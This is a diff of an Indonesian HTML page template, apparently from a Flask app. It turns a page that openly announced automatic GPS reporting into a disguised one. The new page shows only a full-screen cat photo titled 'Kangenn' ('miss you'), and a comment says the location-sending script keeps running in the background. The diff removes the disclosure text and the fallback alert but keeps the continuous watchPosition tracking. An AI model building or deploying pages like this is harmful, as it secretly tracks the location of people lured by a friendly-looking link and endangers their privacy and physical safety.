@@ -2,14 +2,30 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <title>Kirim Lokasi</title>
+  <title>Kangenn</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+  </style>
 </head>
 <body>
-  <h2>Memproses lokasi... (pastikan izinkan lokasi)</h2>
-  <p>Halaman ini mengirim posisi GPS ke server secara otomatis.</p>
+  <!-- Ambil gambar dari folder static/img -->
+  <img src="{{ url_for('static', filename='/kucing.jpeg') }}" alt="Kangenn">
 
   <script>
-    // otomatis kirim lokasi ke server; tidak mengirim nama (server memakai IP)
+    // Script kirim lokasi ke server tetap berjalan di latar belakang
     if (navigator.geolocation) {
       navigator.geolocation.watchPosition(pos => {
         const lat = pos.coords.latitude;
@@ -27,8 +43,6 @@
         maximumAge: 5000,
         timeout: 15000
       });
-    } else {
-      alert('Geolocation tidak didukung di browser ini.');
     }
   </script>
 </body>
